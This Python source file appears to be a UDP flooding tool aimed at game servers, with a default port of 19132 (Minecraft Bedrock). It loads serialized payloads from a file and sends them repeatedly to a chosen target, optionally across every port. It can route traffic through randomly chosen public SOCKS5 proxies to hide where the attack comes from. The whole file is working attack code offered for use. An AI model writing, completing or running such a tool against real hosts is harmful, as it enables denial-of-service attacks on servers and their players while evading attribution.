import marshal
import random
import socket
import time
import os
import argparse

from motd import send_pkt as send_motd_pkt
from api import get_udp_socket, is_ipv6_addr, log


def get_proxy() -> list:
    try:
        log(f"Trying to get proxy data from api...", quiet=quiet_mode)
        proxy_info = requests.get(
            f"https://www.proxyscan.io/api/proxy?last_check=3600&uptime=&ping=&limit=1&type=socks5&format=json&country={proxyCountry}").json()
        proxy_addr = proxy_info[0]['Ip']
        proxy_port = proxy_info[0]['Port']
        return proxy_addr, int(proxy_port)
    except:
        if not os.path.exists(r"socks5.txt"):
            log(f"Request api failed. Downloading proxy list...", quiet=quiet_mode)
            wget.download(
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
            print()
            log(f"Proxy list downloaded!", quiet=quiet_mode)
        with open("socks5.txt", "r") as file:
            socks_list = file.readlines()
            random_index = random.randint(0, len(socks_list) - 1)
            proxy = socks_list[random_index]
            proxy_addr, proxy_port = proxy.rsplit(':', 1)
            return proxy_addr, int(proxy_port)


def create_socket():
    local_port = random.randint(1024, 65535)
    proxy_addr, proxy_port = None, None
    if proxy_used:
        udp_skt = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        proxy_addr, proxy_port = get_proxy()
        udp_skt.set_proxy(socks.SOCKS5, proxy_addr, proxy_port)
        if proxy_used:
            log(f"Used proxy: {proxy_addr}:{proxy_port}")
    else:
        udp_skt = get_udp_socket(local_port, 1, use_ipv6)
    return local_port, udp_skt


def send_pkt(target_addr: str, port: int, payload_file: str, loops: int, interval: float):
    for i in range(loops):
        try:
            local_port, udp_skt = create_socket()
        except:
            continue
        payloads = None
        try:
            payloads = marshal.load(open(payload_file, "rb"))
        except:
            log(f"Payload file {payload_file} not found!", quiet=quiet_mode)
            os._exit(114514)
        try:
            if is_display_motd:
                send_motd_pkt(target_addr, port)
        except:
            if is_display_motd:
                log(f"Target server offline.", quiet=quiet_mode)
        try:
            if port == "*":
                for port in range(65535):
                    for line in payloads:
                        udp_skt.sendto(line, (target_addr, port))
            else:
                for line in payloads:
                    udp_skt.sendto(line, (target_addr, int(port)))
            log(f"Loop {i} done, used local port: {local_port} \n", quiet=quiet_mode)
        except:
            log(f"Loop {i} error! Skip...\n", quiet=quiet_mode)
            pass
        if i+1 < loops:
            time.sleep(interval)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target", type=str, help="Target (IP/Domain)")
    parser.add_argument("file", type=str, help="Payload file path")
    parser.add_argument("-p", "--port", type=int, default=19132, help="Port (Number)")
    parser.add_argument("-l", "--loops", type=int, default=1, help="Loops (Number)")
    parser.add_argument("-i", "--interval", type=float, default=10, help="Interval (sec)")
    parser.add_argument("-q", "--quiet", action="store_true", default=False, help="Quiet mode. no output")
    parser.add_argument("-d", "--display_motd", action="store_true", default=False, help="Display Motd")
    parser.add_argument("-pu", "--proxy_used", action="store_true", default=False, help="Use Proxy")
    parser.add_argument("-pc", "--proxy_country", type=str, default="us", help="ProxyCountry (like cn, ru, us or enter to use all)")
    parser.add_argument("-v6", "--use-ipv6", action="store_true", default=False, help="use IPv6 instead of IPv4")
    args = parser.parse_args()
    
    target = args.target
    port = args.port
    file = args.file
    loops = args.loops
    interval = args.interval
    is_display_motd = args.display_motd
    quiet_mode = args.quiet
    proxy_used = args.proxy_used
    proxyCountry = args.proxy_country
    use_ipv6 = args.use_ipv6
    
    if proxy_used:
        try:
            import wget
            import socks
            import requests
        except Exception as error:
            print(error)
            log("Import module error! Run \"pip install -r requirements.txt\" to install dependent modules? [y/n] ")
            if input() == "y":
                os.system("pip install -r requirements.txt")
                log("Success. Please restart this program!")
            os._exit(1)
        log("Proxy mode is under development!")
    
    send_pkt(target, port, file, loops, interval)
